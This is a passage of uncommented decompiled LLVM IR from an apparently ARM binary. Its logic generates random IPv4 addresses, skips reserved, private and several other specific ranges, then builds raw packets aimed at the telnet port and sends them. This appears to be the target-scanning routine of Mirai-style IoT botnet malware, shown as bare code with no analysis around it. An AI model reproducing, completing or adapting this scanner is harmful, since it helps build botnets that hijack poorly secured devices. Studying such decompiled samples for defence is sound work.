  %v4_10ee8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint (i32* @global_var_16194.302 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_161a0.304 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_10ef8 = call i32 @function_10778(i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), i32 ptrtoint (i32* @global_var_161a0.304 to i32), i32 8)
  store i32 ptrtoint ([7 x i8]* @global_var_161ac.306 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15f78.220 to i32), i32* %r1.global-to-local, align 4
  %v0_10f04 = load i32, i32* @r6, align 4
  store i32 %v0_10f04, i32* %r2.global-to-local, align 4
  %v4_10f08 = call i32 @function_10778(i32 ptrtoint ([7 x i8]* @global_var_161ac.306 to i32), i32 ptrtoint (i32* @global_var_15f78.220 to i32), i32 %v0_10f04)
  %v0_10f0c = load i32, i32* @r6, align 4
  store i32 %v0_10f0c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_161b4.308 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_161bc.310 to i32), i32* %r1.global-to-local, align 4
  %v4_10f18 = call i32 @function_10778(i32 ptrtoint (i32* @global_var_161b4.308 to i32), i32 ptrtoint ([7 x i8]* @global_var_161bc.310 to i32), i32 %v0_10f0c)
  store i32 ptrtoint ([9 x i8]* @global_var_161c4.312 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_161c4.312 to i32), i32* %r1.global-to-local, align 4
  %v5_10f28 = call i32 @function_10778(i32 ptrtoint ([9 x i8]* @global_var_161c4.312 to i32), i32 ptrtoint ([9 x i8]* @global_var_161c4.312 to i32), i32 8)
  store i32 ptrtoint ([9 x i8]* @global_var_161d0.314 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_161d0.314 to i32), i32* %r1.global-to-local, align 4
  %v5_10f38 = call i32 @function_10778(i32 ptrtoint ([9 x i8]* @global_var_161d0.314 to i32), i32 ptrtoint ([9 x i8]* @global_var_161d0.314 to i32), i32 8)
  %v2_10f40 = ptrtoint i32* %stack_var_-1862 to i32
  store i32 %v2_10f40, i32* %r0.global-to-local, align 4
  %v2_10f44 = ptrtoint i32* %stack_var_-1842 to i32
  store i32 %v2_10f44, i32* %r1.global-to-local, align 4
  %tmp277 = bitcast i32* %stack_var_-1842 to i8*
  br label %dec_label_pc_10f50

dec_label_pc_10f50:                               ; preds = %dec_label_pc_115a8, %dec_label_pc_10a68
  %stack_var_-1872.0 = phi i32 [ %tmp239, %dec_label_pc_10a68 ], [ %stack_var_-1872.2, %dec_label_pc_115a8 ]
  %stack_var_-1884.0 = phi i8* [ %tmp277, %dec_label_pc_10a68 ], [ %stack_var_-1884.1, %dec_label_pc_115a8 ]
  %v0_11280 = phi i32 [ %v2_10f40, %dec_label_pc_10a68 ], [ %stack_var_-1880.1, %dec_label_pc_115a8 ]
  %stack_var_-1876.0 = phi i8 [ %v5_10a50.le, %dec_label_pc_10a68 ], [ %stack_var_-1876.1, %dec_label_pc_115a8 ]
  store i32 ptrtoint (i32* @global_var_1ec70.185 to i32), i32* %r2.global-to-local, align 4
  store i32 %stack_var_-1872.0, i32* %r3.global-to-local, align 4
  %v2_10f58 = load i32, i32* @global_var_1ec70.185, align 4
  store i32 %v2_10f58, i32* @r8, align 4
  %v3_10f5c = icmp uge i32 %stack_var_-1872.0, %v2_10f58
  store i1 %v3_10f5c, i1* %cpsr_c.global-to-local, align 1
  %v9_10f5c = icmp eq i32 %stack_var_-1872.0, %v2_10f58
  store i1 %v9_10f5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10f5c, label %dec_label_pc_11208, label %dec_label_pc_10f64

dec_label_pc_10f64:                               ; preds = %dec_label_pc_10f50
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  %v2_111d8 = ptrtoint i32* %stack_var_-92 to i32
  br label %dec_label_pc_10f70

dec_label_pc_10f70:                               ; preds = %.thread47.dec_label_pc_10f70_crit_edge, %dec_label_pc_10f64
  %v0_10f70 = phi i32 [ %v0_10f70.pre, %.thread47.dec_label_pc_10f70_crit_edge ], [ 0, %dec_label_pc_10f64 ]
  store i32 %v0_10f70, i32* %stack_var_-92, align 4
  store i32 %v0_10f70, i32* %stack_var_-84, align 4
  %v0_10f80 = call i32 @function_fe60()
  %v1_10f80 = trunc i32 %v0_10f80 to i8
  store i32 %v0_10f80, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ecb8.86 to i32), i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1ec40.201 to i32), i32* %r1.global-to-local, align 4
  %v2_10f8c = load i32, i32* @global_var_1ecb8.86, align 4
  store i32 %v2_10f8c, i32* %r2.global-to-local, align 4
  %v2_10f90 = and i32 %v0_10f80, 128
  %v3_10f90 = icmp ne i32 %v2_10f90, 0
  store i1 %v3_10f90, i1* %cpsr_c.global-to-local, align 1
  %v4_10f90 = sdiv i32 %v0_10f80, 256
  store i32 %v4_10f90, i32* %r3.global-to-local, align 4
  %v1_10f94 = trunc i32 %v4_10f90 to i8
  store i8 %v1_10f94, i8* bitcast (i32* @global_var_1ec45.208 to i8*), align 4
  store i32 %v2_10f8c, i32* @global_var_1ec4c.315, align 4
  store i8 %v1_10f80, i8* bitcast (i32* @global_var_1ec44.212 to i8*), align 4
  br label %dec_label_pc_10fa0

dec_label_pc_10fa0:                               ; preds = %dec_label_pc_11074, %dec_label_pc_10fd0, %dec_label_pc_110a8, %dec_label_pc_1109c, %dec_label_pc_11090, %dec_label_pc_11084, %.thread32, %bb296, %bb295, %bb294, %bb293, %bb292, %dec_label_pc_1106c, %dec_label_pc_11064, %bb288, %dec_label_pc_11034, %dec_label_pc_11010, %bb281, %dec_label_pc_10fe0, %bb280, %dec_label_pc_10fc8, %bb279, %bb298, %dec_label_pc_10f70
  %v0_10fa0 = call i32 @function_fe60()
  store i32 %v0_10fa0, i32* %r0.global-to-local, align 4
  %v1_10fa4 = urem i32 %v0_10fa0, 256
  store i32 %v1_10fa4, i32* %r1.global-to-local, align 4
  %v3_10fa8 = udiv i32 %v0_10fa0, 256
  store i32 %v3_10fa8, i32* %r3.global-to-local, align 4
  %v3_10fac = udiv i32 %v0_10fa0, 65536
  store i32 %v3_10fac, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10fb0 = icmp eq i32 %v1_10fa4, 0
  store i1 %v2_10fb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10fb0, label %bb279, label %bb278

bb278:                                            ; preds = %dec_label_pc_10fa0
  %v3_10fb4 = icmp ugt i32 %v1_10fa4, 126
  store i1 %v3_10fb4, i1* %cpsr_c.global-to-local, align 1
  %v8_10fb4 = icmp eq i32 %v1_10fa4, 127
  store i1 %v8_10fb4, i1* %cpsr_z.global-to-local, align 1
  br label %bb279

bb279:                                            ; preds = %dec_label_pc_10fa0, %bb278
  %v0_10fc4 = phi i1 [ true, %dec_label_pc_10fa0 ], [ %v8_10fb4, %bb278 ]
  %v1_10fb8 = urem i32 %v3_10fa8, 256
  store i32 %v1_10fb8, i32* %ip.global-to-local, align 4
  %v1_10fbc = urem i32 %v3_10fac, 256
  store i32 %v1_10fbc, i32* %r2.global-to-local, align 4
  %v1_10fc0 = and i32 %v0_10fa0, 8388608
  %v2_10fc0 = icmp ne i32 %v1_10fc0, 0
  store i1 %v2_10fc0, i1* %cpsr_c.global-to-local, align 1
  %v3_10fc0 = udiv i32 %v0_10fa0, 16777216
  store i32 %v3_10fc0, i32* %r0.global-to-local, align 4
  br i1 %v0_10fc4, label %dec_label_pc_10fa0, label %dec_label_pc_10fc8

dec_label_pc_10fc8:                               ; preds = %bb279
  %v2_10fc8 = icmp ugt i32 %v1_10fa4, 2
  store i1 %v2_10fc8, i1* %cpsr_c.global-to-local, align 1
  %v7_10fc8 = icmp eq i32 %v1_10fa4, 3
  store i1 %v7_10fc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fc8, label %dec_label_pc_10fa0, label %dec_label_pc_10fd0

dec_label_pc_10fd0:                               ; preds = %dec_label_pc_10fc8
  %v1_10fd0 = add nsw i32 %v1_10fa4, -15
  store i32 %v1_10fd0, i32* %r3.global-to-local, align 4
  %v2_10fd4 = icmp ugt i32 %v1_10fa4, 55
  store i1 %v2_10fd4, i1* %cpsr_c.global-to-local, align 1
  %v7_10fd4 = icmp eq i32 %v1_10fa4, 56
  store i1 %v7_10fd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fd4, label %dec_label_pc_10fa0, label %bb280

bb280:                                            ; preds = %dec_label_pc_10fd0
  %v3_10fd8 = icmp ne i32 %v1_10fd0, 0
  store i1 %v3_10fd8, i1* %cpsr_c.global-to-local, align 1
  %v8_10fd8 = icmp eq i32 %v1_10fd0, 1
  store i1 %v8_10fd8, i1* %cpsr_z.global-to-local, align 1
  %v2_10fdc = xor i1 %v3_10fd8, true
  %v3_10fdc = or i1 %v8_10fd8, %v2_10fdc
  br i1 %v3_10fdc, label %dec_label_pc_10fa0, label %dec_label_pc_10fe0

dec_label_pc_10fe0:                               ; preds = %bb280
  %v2_10fe0 = icmp ugt i32 %v1_10fa4, 9
  store i1 %v2_10fe0, i1* %cpsr_c.global-to-local, align 1
  %v7_10fe0 = icmp eq i32 %v1_10fa4, 10
  store i1 %v7_10fe0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fe0, label %dec_label_pc_10fa0, label %dec_label_pc_10fe8

dec_label_pc_10fe8:                               ; preds = %dec_label_pc_10fe0
  %v2_10fe8 = icmp ugt i32 %v1_10fa4, 191
  store i1 %v2_10fe8, i1* %cpsr_c.global-to-local, align 1
  %v7_10fe8 = icmp eq i32 %v1_10fa4, 192
  store i1 %v7_10fe8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fe8, label %bb281, label %dec_label_pc_10ff4

bb281:                                            ; preds = %dec_label_pc_10fe8
  %v3_10fec = icmp ugt i32 %v1_10fb8, 167
  store i1 %v3_10fec, i1* %cpsr_c.global-to-local, align 1
  %v8_10fec = icmp eq i32 %v1_10fb8, 168
  store i1 %v8_10fec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10fec, label %dec_label_pc_10fa0, label %dec_label_pc_10ff4

dec_label_pc_10ff4:                               ; preds = %dec_label_pc_10fe8, %bb281
  %v7_10ff4 = icmp eq i32 %v1_10fa4, 172
  %.345 = zext i1 %v7_10ff4 to i32
  store i32 %.345, i32* %r3.global-to-local, align 4
  %v2_11000 = icmp ugt i32 %v1_10fb8, 14
  store i1 %v2_11000, i1* %cpsr_c.global-to-local, align 1
  %v7_11000 = icmp eq i32 %v1_10fb8, 15
  store i1 %v7_11000, i1* %cpsr_z.global-to-local, align 1
  %v2_11004 = xor i1 %v2_11000, true
  %v3_11004 = or i1 %v7_11000, %v2_11004
  br i1 %v3_11004, label %.thread10, label %bb284

.thread10:                                        ; preds = %dec_label_pc_10ff4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11018

bb284:                                            ; preds = %dec_label_pc_10ff4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11008 = icmp eq i1 %v7_10ff4, false
  store i1 %v2_11008, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11008, label %dec_label_pc_11018, label %dec_label_pc_11010

dec_label_pc_11010:                               ; preds = %bb284
  %v2_11010 = icmp ugt i32 %v1_10fb8, 30
  store i1 %v2_11010, i1* %cpsr_c.global-to-local, align 1
  %v7_11010 = icmp eq i32 %v1_10fb8, 31
  store i1 %v7_11010, i1* %cpsr_z.global-to-local, align 1
  %v2_11014 = xor i1 %v2_11010, true
  %v3_11014 = or i1 %v7_11010, %v2_11014
  br i1 %v3_11014, label %dec_label_pc_10fa0, label %dec_label_pc_11018

dec_label_pc_11018:                               ; preds = %.thread10, %dec_label_pc_11010, %bb284
  %v7_11018 = icmp eq i32 %v1_10fa4, 100
  %.346 = zext i1 %v7_11018 to i32
  store i32 %.346, i32* %r3.global-to-local, align 4
  %v2_11024 = icmp ugt i32 %v1_10fb8, 62
  store i1 %v2_11024, i1* %cpsr_c.global-to-local, align 1
  %v7_11024 = icmp eq i32 %v1_10fb8, 63
  store i1 %v7_11024, i1* %cpsr_z.global-to-local, align 1
  %v2_11028 = xor i1 %v2_11024, true
  %v3_11028 = or i1 %v7_11024, %v2_11028
  br i1 %v3_11028, label %.thread15, label %bb287

.thread15:                                        ; preds = %dec_label_pc_11018
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1103c

bb287:                                            ; preds = %dec_label_pc_11018
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1102c = icmp eq i1 %v7_11018, false
  store i1 %v2_1102c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1102c, label %dec_label_pc_1103c, label %dec_label_pc_11034

dec_label_pc_11034:                               ; preds = %bb287
  %v2_11034 = icmp ugt i32 %v1_10fb8, 125
  store i1 %v2_11034, i1* %cpsr_c.global-to-local, align 1
  %v7_11034 = icmp eq i32 %v1_10fb8, 126
  store i1 %v7_11034, i1* %cpsr_z.global-to-local, align 1
  %v2_11038 = xor i1 %v2_11034, true
  %v3_11038 = or i1 %v7_11034, %v2_11038
  br i1 %v3_11038, label %dec_label_pc_10fa0, label %dec_label_pc_1103c

dec_label_pc_1103c:                               ; preds = %.thread15, %dec_label_pc_11034, %bb287
  %v2_1103c = icmp ugt i32 %v1_10fa4, 168
  store i1 %v2_1103c, i1* %cpsr_c.global-to-local, align 1
  %v7_1103c = icmp eq i32 %v1_10fa4, 169
  store i1 %v7_1103c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1103c, label %bb288, label %dec_label_pc_11048

bb288:                                            ; preds = %dec_label_pc_1103c
  %v3_11040 = icmp eq i32 %v1_10fb8, 255
  store i1 %v3_11040, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_11040, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11040, label %dec_label_pc_10fa0, label %dec_label_pc_11048

dec_label_pc_11048:                               ; preds = %dec_label_pc_1103c, %bb288
  %v7_11048 = icmp eq i32 %v1_10fa4, 198
  %.347 = zext i1 %v7_11048 to i32
  store i32 %.347, i32* %r3.global-to-local, align 4
  %v2_11054 = icmp ugt i32 %v1_10fb8, 16
  store i1 %v2_11054, i1* %cpsr_c.global-to-local, align 1
  %v7_11054 = icmp eq i32 %v1_10fb8, 17
  store i1 %v7_11054, i1* %cpsr_z.global-to-local, align 1
  %v2_11058 = xor i1 %v2_11054, true
  %v3_11058 = or i1 %v7_11054, %v2_11058
  br i1 %v3_11058, label %.thread21, label %bb291

.thread21:                                        ; preds = %dec_label_pc_11048
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1106c

bb291:                                            ; preds = %dec_label_pc_11048
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1105c = icmp eq i1 %v7_11048, false
  store i1 %v2_1105c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1105c, label %dec_label_pc_1106c, label %dec_label_pc_11064

dec_label_pc_11064:                               ; preds = %bb291
  %v2_11064 = icmp ugt i32 %v1_10fb8, 18
  store i1 %v2_11064, i1* %cpsr_c.global-to-local, align 1
  %v7_11064 = icmp eq i32 %v1_10fb8, 19
  store i1 %v7_11064, i1* %cpsr_z.global-to-local, align 1
  %v2_11068 = xor i1 %v2_11064, true
  %v3_11068 = or i1 %v7_11064, %v2_11068
  br i1 %v3_11068, label %dec_label_pc_10fa0, label %dec_label_pc_1106c

dec_label_pc_1106c:                               ; preds = %.thread21, %dec_label_pc_11064, %bb291
  %v2_1106c = icmp ugt i32 %v1_10fa4, 222
  store i1 %v2_1106c, i1* %cpsr_c.global-to-local, align 1
  %v7_1106c = icmp eq i32 %v1_10fa4, 223
  store i1 %v7_1106c, i1* %cpsr_z.global-to-local, align 1
  %v2_11070 = xor i1 %v7_1106c, true
  %v3_11070 = and i1 %v2_1106c, %v2_11070
  br i1 %v3_11070, label %dec_label_pc_10fa0, label %dec_label_pc_11074

dec_label_pc_11074:                               ; preds = %dec_label_pc_1106c
  %v1_11074 = add nsw i32 %v1_10fa4, -6
  store i32 %v1_11074, i32* %r3.global-to-local, align 4
  %v2_11078 = icmp ugt i32 %v1_10fa4, 10
  store i1 %v2_11078, i1* %cpsr_c.global-to-local, align 1
  %v7_11078 = icmp eq i32 %v1_10fa4, 11
  store i1 %v7_11078, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11078, label %dec_label_pc_10fa0, label %bb292

bb292:                                            ; preds = %dec_label_pc_11074
  %v3_1107c = icmp ne i32 %v1_11074, 0
  store i1 %v3_1107c, i1* %cpsr_c.global-to-local, align 1
  %v8_1107c = icmp eq i32 %v1_11074, 1
  store i1 %v8_1107c, i1* %cpsr_z.global-to-local, align 1
  %v2_11080 = xor i1 %v3_1107c, true
  %v3_11080 = or i1 %v8_1107c, %v2_11080
  br i1 %v3_11080, label %dec_label_pc_10fa0, label %dec_label_pc_11084

dec_label_pc_11084:                               ; preds = %bb292
  %v2_11084 = icmp ugt i32 %v1_10fa4, 21
  store i1 %v2_11084, i1* %cpsr_c.global-to-local, align 1
  %v7_11084 = icmp eq i32 %v1_10fa4, 22
  store i1 %v7_11084, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11084, label %dec_label_pc_10fa0, label %bb293

bb293:                                            ; preds = %dec_label_pc_11084
  %v3_11088 = icmp ugt i32 %v1_10fa4, 20
  store i1 %v3_11088, i1* %cpsr_c.global-to-local, align 1
  %v8_11088 = icmp eq i32 %v1_10fa4, 21
  store i1 %v8_11088, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11088, label %dec_label_pc_10fa0, label %dec_label_pc_11090

dec_label_pc_11090:                               ; preds = %bb293
  %v2_11090 = icmp ugt i32 %v1_10fa4, 27
  store i1 %v2_11090, i1* %cpsr_c.global-to-local, align 1
  %v7_11090 = icmp eq i32 %v1_10fa4, 28
  store i1 %v7_11090, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11090, label %dec_label_pc_10fa0, label %bb294

bb294:                                            ; preds = %dec_label_pc_11090
  %v3_11094 = icmp ugt i32 %v1_10fa4, 25
  store i1 %v3_11094, i1* %cpsr_c.global-to-local, align 1
  %v8_11094 = icmp eq i32 %v1_10fa4, 26
  store i1 %v8_11094, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11094, label %dec_label_pc_10fa0, label %dec_label_pc_1109c

dec_label_pc_1109c:                               ; preds = %bb294
  %v2_1109c = icmp ugt i32 %v1_10fa4, 29
  store i1 %v2_1109c, i1* %cpsr_c.global-to-local, align 1
  %v7_1109c = icmp eq i32 %v1_10fa4, 30
  store i1 %v7_1109c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1109c, label %dec_label_pc_10fa0, label %bb295

bb295:                                            ; preds = %dec_label_pc_1109c
  %v3_110a0 = icmp ugt i32 %v1_10fa4, 28
  store i1 %v3_110a0, i1* %cpsr_c.global-to-local, align 1
  %v8_110a0 = icmp eq i32 %v1_10fa4, 29
  store i1 %v8_110a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_110a0, label %dec_label_pc_10fa0, label %dec_label_pc_110a8

dec_label_pc_110a8:                               ; preds = %bb295
  %v2_110a8 = icmp ugt i32 %v1_10fa4, 54
  store i1 %v2_110a8, i1* %cpsr_c.global-to-local, align 1
  %v7_110a8 = icmp eq i32 %v1_10fa4, 55
  store i1 %v7_110a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_110a8, label %dec_label_pc_10fa0, label %bb296

bb296:                                            ; preds = %dec_label_pc_110a8
  %v3_110ac = icmp ugt i32 %v1_10fa4, 32
  store i1 %v3_110ac, i1* %cpsr_c.global-to-local, align 1
  %v8_110ac = icmp eq i32 %v1_10fa4, 33
  store i1 %v8_110ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_110ac, label %dec_label_pc_10fa0, label %dec_label_pc_110b4

dec_label_pc_110b4:                               ; preds = %bb296
  %v2_110b4 = icmp ugt i32 %v1_10fa4, 214
  store i1 %v2_110b4, i1* %cpsr_c.global-to-local, align 1
  %v7_110b4 = icmp eq i32 %v1_10fa4, 215
  store i1 %v7_110b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_110b4, label %.thread32, label %bb297

bb297:                                            ; preds = %dec_label_pc_110b4
  %v3_110b8 = icmp ugt i32 %v1_10fa4, 213
  store i1 %v3_110b8, i1* %cpsr_c.global-to-local, align 1
  %v8_110b8 = icmp eq i32 %v1_10fa4, 214
  store i1 %v8_110b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_110b8, label %bb298, label %dec_label_pc_110c8

.thread32:                                        ; preds = %dec_label_pc_110b4
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10fa0

bb298:                                            ; preds = %bb297
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10fa0

dec_label_pc_110c8:                               ; preds = %bb297
  store i32 0, i32* @r4, align 4
  %v5_110d4 = call i32 @llvm.bswap.i32(i32 %v0_10fa0)
  store i32 %v5_110d4, i32* %r3.global-to-local, align 4
  %tmp299 = and i32 %v0_10fa0, 65280
  %tmp300 = call i32 @llvm.bswap.i32(i32 %tmp299)
  %v1_110dc = and i32 %v5_110d4, ptrtoint (i32* @global_var_ff00.24 to i32)
  %v3_110e0 = mul nuw i32 %v3_10fc0, 16777216
  %v3_110e4 = udiv i32 %tmp300, 256
  %v4_110e8 = mul i32 %v1_110dc, 256
  %tmp301 = and i32 %v0_10fa0, 32768
  %v3_110ec = icmp ne i32 %tmp301, 0
  store i1 %v3_110ec, i1* %cpsr_c.global-to-local, align 1
  %v4_110ec = udiv i32 %v5_110d4, 16777216
  store i32 ptrtoint (i8** @global_var_1ec40.201 to i32), i32* @r0, align 4
  %v5_110ec = or i32 %v4_110ec, %v3_110e0
  %v5_110e8 = or i32 %v5_110ec, %v4_110e8
  %v2_110f4 = or i32 %v5_110e8, %v3_110e4
  store i32 %v2_110f4, i32* %r2.global-to-local, align 4
  %v5_110f8 = trunc i32 %v4_110ec to i8
  store i8 %v5_110f8, i8* @global_var_1ec50.316, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i8 0, i8* bitcast (i32* @global_var_1ec4a.317 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1ec4b.318 to i8*), align 4
  %v3_11108 = call i32 @function_e424(i32 ptrtoint (i8** @global_var_1ec40.201 to i32), i32 20)
  store i32 ptrtoint (i8** @global_var_1ec40.201 to i32), i32* %ip.global-to-local, align 4
  %sext6 = mul i32 %v3_11108, 16777216
  %v1_11110 = sdiv i32 %sext6, 16777216
  store i32 %v1_11110, i32* %r3.global-to-local, align 4
  %v2_11114 = and i32 %v1_11110, 128
  %v3_11114 = icmp ne i32 %v2_11114, 0
  store i1 %v3_11114, i1* %cpsr_c.global-to-local, align 1
  %v4_11114 = ashr i32 %sext6, 31
  store i32 %v4_11114, i32* %r2.global-to-local, align 4
  %v1_11118 = trunc i32 %v1_11110 to i8
  store i8 %v1_11118, i8* bitcast (i32* @global_var_1ec4a.317 to i8*), align 4
  %v1_1111c = trunc i32 %v4_11114 to i8
  store i8 %v1_1111c, i8* bitcast (i32* @global_var_1ec4b.318 to i8*), align 4
  %v3_11120 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_11120, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_11128 = call i32 @function_134c4(i32 %v3_11120, i32 10)
  store i32 %v2_11128, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1112c = icmp eq i32 %v2_11128, 0
  store i1 %v2_1112c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1112c, label %.thread198, label %bb302

.thread198:                                       ; preds = %dec_label_pc_110c8
  store i32 ptrtoint (i32* @global_var_1ec54.205 to i32), i32* @lr, align 4
  br label %.thread42.thread73

bb302:                                            ; preds = %dec_label_pc_110c8
  store i32 ptrtoint (i32* @global_var_1ec54.205 to i32), i32* %r0.global-to-local, align 4
  store i32 23, i32* %r3.global-to-local, align 4
  %v1_1113c = load i32, i32* @r4, align 4
  %v2_1113c = trunc i32 %v1_1113c to i8
  store i8 %v2_1113c, i8* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1ec54.205 to i32), i32 2) to i8*), align 2
  %v0_11140.pr.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11140.pr.pre, label %.thread42.thread73, label %.thread39

.thread39:                                        ; preds = %bb302
  %v1_11140 = load i32, i32* %r3.global-to-local, align 4
  %v2_11140 = trunc i32 %v1_11140 to i8
  %v3_11140 = load i32, i32* %r0.global-to-local, align 4
  %v4_11140 = add i32 %v3_11140, 3
  %v5_11140 = inttoptr i32 %v4_11140 to i8*
  store i8 %v2_11140, i8* %v5_11140, align 1
  %v0_11148.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i8** @global_var_1ec40.201 to i32), i32* %r0.global-to-local, align 4
  br i1 %v0_11148.pr.pr, label %.thread45, label %.thread47

.thread42.thread73:                               ; preds = %bb302, %.thread198
  store i32 ptrtoint (i8** @global_var_1ec40.201 to i32), i32* %r0.global-to-local, align 4
  br label %.thread45

.thread45:                                        ; preds = %.thread39, %.thread42.thread73
  store i32 9, i32* %r3.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  %v3_11150 = load i32, i32* @lr, align 4
  %v4_11150 = add i32 %v3_11150, 2
  %v5_11150 = inttoptr i32 %v4_11150 to i8*
  store i8 9, i8* %v5_11150, align 1
  %v0_11154.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11154.pr.pr, label %bb303, label %.thread47

bb303:                                            ; preds = %.thread45
  %v1_11154 = load i32, i32* %r2.global-to-local, align 4
  %v2_11154 = trunc i32 %v1_11154 to i8
  %v3_11154 = load i32, i32* @lr, align 4
  %v4_11154 = add i32 %v3_11154, 3
  %v5_11154 = inttoptr i32 %v4_11154 to i8*
  store i8 %v2_11154, i8* %v5_11154, align 1
  br label %.thread47

.thread47:                                        ; preds = %.thread39, %.thread45, %bb303
  %v4_11158 = load i8, i8* @global_var_1ec50.316, align 1
  %v5_11158 = sext i8 %v4_11158 to i32
  store i32 %v5_11158, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ec54.205 to i32), i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ec54.205 to i32), i32* @r1, align 4
  store i8 %v4_11158, i8* @global_var_1ec58.319, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_11170 = load i32, i32* %sl.global-to-local, align 4
  %v1_11170 = trunc i32 %v0_11170 to i8
  store i8 %v1_11170, i8* bitcast (i32* @global_var_1ec64.320 to i8*), align 4
  store i8 %v1_11170, i8* bitcast (i32* @global_var_1ec65.321 to i8*), align 4
  %v5_11178 = call i32 @function_e480(i32 ptrtoint (i8** @global_var_1ec40.201 to i32), i32 ptrtoint (i32* @global_var_1ec54.205 to i32), i32 5120, i32 20)
  %sext = mul i32 %v5_11178, 16777216
  %v1_11180 = sdiv i32 %sext, 16777216
  %v3_11188 = ashr i32 %sext, 31
  %v2_1118c = load i32, i32* @global_var_1ec54.205, align 4
  %v1_11194 = trunc i32 %v3_11188 to i8
  store i8 %v1_11194, i8* bitcast (i32* @global_var_1ec65.321 to i8*), align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v3_111a8 = load i8, i8* @global_var_1ec50.316, align 1
  %v4_111a8 = sext i8 %v3_111a8 to i32
  store i32 %v4_111a8, i32* @r4, align 4
  %v2_111ac = load i32, i32* @global_var_1ecd8.199, align 4
  store i32 %v2_111ac, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ec54.205 to i32), i32* %ip.global-to-local, align 4
  %v1_111bc = and i32 %v2_1118c, 8388608
  %v2_111bc = icmp ne i32 %v1_111bc, 0
  store i1 %v2_111bc, i1* %cpsr_c.global-to-local, align 1
  %v1_111c4 = trunc i32 %v1_11180 to i8
  store i8 %v1_111c4, i8* bitcast (i32* @global_var_1ec64.320 to i8*), align 4
  store i32 ptrtoint (i8** @global_var_1ec40.201 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v2_111d8, i32* %lr.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v8_111ec = call i32 @function_13f2c(i32 %v2_111ac, i32* bitcast (i8** @global_var_1ec40.201 to i32*), i32 40, i32 16384, i32 %v2_111d8, i32 16)
  store i32 %v8_111ec, i32* %r0.global-to-local, align 4
